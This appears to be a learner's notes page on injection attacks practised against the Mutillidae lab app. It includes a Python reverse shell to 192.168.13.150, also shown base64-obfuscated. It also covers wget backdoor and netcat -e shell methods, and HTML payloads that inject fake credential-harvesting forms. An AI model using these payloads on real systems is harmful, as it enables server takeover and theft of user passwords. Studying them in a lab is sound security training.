<h1>Other forms of Injection</h1>
<p>
	The purpose of injection remains the same , injecting into an interpreted context for causing the application to perform an unintended functionality.
</p>
<ol>
<li><h2>Command Injection:</h2>
<p> Command injection referes to the attack mechanism in which an attacker can inject any command into the 
underlying OS and compromise the back-end system. Mutillidae for me is hosted on a Linux server, so will be using UNIX commands for the same. Getting shell access on the underlying server system is often the jackpot to any attacker. We can create persistent backdoors with the help of metasploit.
</p>
<ul>
<li>
<h3>Method 1:</h3>
Download a php backdoor via wget using the command injection flaw
And then use that backdoor. 
Catch: /var/www should be writeable
If .htacess is modifiable, we can modify .htacess and make /var/www writeable
</li>
<li><h3>Method 2:Netcat shell</h3>
Use Netcat with <b>"-e"</b> option to allow for command execution after connect.
The -e executes whatever we place in after the parameter. In this case we want to spawn a 
bash shell on tcp connect. 
However, this option is not present on many traditional netcat installations
What to do in this case?
Well we can go for a custom shell in a language of our choice
</li> 
<li><h3>Method 3:Python shell(any language installed on backend)</h3>
Set up a listener on attacker machine
<pre>
python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('192.168.13.150',1234))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"
</pre>
For obfuscation , we could also base64 encode and decode string
python -c "exec('aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcztzID0gc29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgo\n4oCYMTkyLjE2OC4xMy4xNTDigJksOTAwMCkpCndoaWxlIDE6ICBwcm9jID0gc3VicHJvY2Vzcy5Q\nb3BlbihzLnJlY3YoMTAyNCksIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0\nZGVycj1zdWJwcm9jZXNzLlBJUEUsIHN0ZGluPXN1YnByb2Nlc3MuUElQRSk7cy5zZW5kKHByb2Mu\nc3Rkb3V0LnJlYWQoKStwcm9jLnN0ZGVyci5yZWFkKCkp\n'.decode('base64'))"
</li>
<li><h3>Method-4: Meterpreter Shell</h3>
Deploying a Meterpreter shell is one way to create a well obfuscated persisitent backdoor to any OS we have shell acess on.How to create and deploy a meterpreter shell is a different and vast topic altogether.
</li>
</ul>
<li><h2>Frame Source injection</h2>
	Similar to a Remote file inclusion vulnerability. We can include any special characters once they  are URL encoded to cause an XSS attack on the site. We can include any iframe of our choice such as a malicious form and then steal user credentials or make cross-domain requests. We could inject a remote page into the src of the iframe.
	<p> iframe sources should never be allowed to be controlled by user input, as the iframe can load potential malware from other site. There are other security risks as well. I found this blog very helpful.
	<a href="https://stackoverflow.com/questions/7289139/why-are-iframes-considered-dangerous-and-a-security-risk?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa">Why Iframes pose a security risk?</a>
	We can corrupt the iframe src to load xss attacking page from our server or even an AJAX request to our site. We can inject this to the vulnerable parameter and let the fun unroll, or even a remote html page from the attacking server of our choice. 
	<pre>
		%3Ch1%3ESession+Expired%3C%2Fh1%3E%0D%0A%3Cform+action%3D%22Marale%22%3E%0D%0A%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22password%22%2F%3E%0D%0A%3Cinput+name%3D%22name%22+placeholder%3D%22name%22%2F%3E%0D%0A%3Cinput+type%3D%22submit%22%2F%3E%0D%0A%3C%2Fform%3E%3C%21--
	</pre> 
</li>
<li><h2>HTML Injection </h2>
	When there is a vulnerability in the application which allow you to inject HTML into code.
	This can cause the client to visit a vulnerable "GET" URL and steal Non-http cookies or reveal csrf token to an attacker via an Ajax request. There are a multitude ways this can be exploited.
</br>
	Also, some of these require different contexts , such as those when modifying things such as the HTTP headers, as the victim will not change these to attack himself if the HTML injected is not stored but reflected back. In case of submissions via POST request, the POST requests now can be stored in a clickable link which can be visited via DATA URI.Also, if a site is vulnerable to HTMLi ,it most likely is vulnerable to Javascript Injection as well 
	<ul>
		<li><h3>Basic</h3>
		<p>Simple case, where the input fields visible are vulnerable to HTML injection. You may use any of the web pages, <b>"Add to your Blog"</b> is what I have exploited. Make sure not to use single quotes or else the SQL query will explode</p>
		<pre>
&ltform action="/attacked"&gt
&ltinput name="user"/&gt
&ltinput id='ps' type="password" name="pass"/&gt
&ltbutton type="submit"&gtRegister&lt/button&gt
&lt/form&gt
		</pre>
	</li>
	<li>
		<h3>Via HTTP Headers</h3>
		<p>
			These exploits can work under a man in the middle the attack, or a clever manipulation of the iframe header to load the web page silently in the background. The target page here is DNS lookup page. We must always check the context and filters on the 
			Using Burp intercept the outgoing request. In the DNS lookup page, I am targetting the vulnerability labelled as <b>"Those Back Buttons"</b>.
		</p>
			<p>
				In the beginning , visit this page from another page. As MITM simulation, intercept using Burp, and modify the Referer header to something like this &lt+&gt to see where the payload is getting injected. When the page loads, inspect the backbutton which loads the value from 
				<i>window.href.location</i>. Its value will be like this.
		<pre>
&lta onclick="document.location.href='&lt+&gt';"&gt

		</pre>
		So , now knowing the context and the fact that there is no encoding or sanitization defense, we do this.
		<pre>
';"&lt&gtform action='Marale'&lt&gtinput type='password' name='password' placeholder='password'/&lt&gtinput name='name' placeholder='name'/&lt&gtinput type='submit'/&lt&gtlt/form&gt&lt!--
		</pre>
	</p>
	</li>
	<li><h3>DOM Manipulation</h3></li>
	<li><h3>Cookie Manipulation</h3></li>
	<li><h3>HTTP Parameter Pollution</h3></li>
	</ul>
</li>



